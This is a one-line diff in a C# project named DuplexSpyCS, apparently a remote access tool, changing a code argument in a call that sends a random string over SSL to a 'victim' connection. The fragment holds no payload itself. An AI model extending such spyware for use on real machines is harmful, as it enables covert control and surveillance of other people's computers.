@@ -143,7 +143,7 @@ namespace DuplexSpyCS
                 byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSslSend(0, 0, clsEZData.fnGenerateRandomStr());
+                victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());
 
                 do
                 {
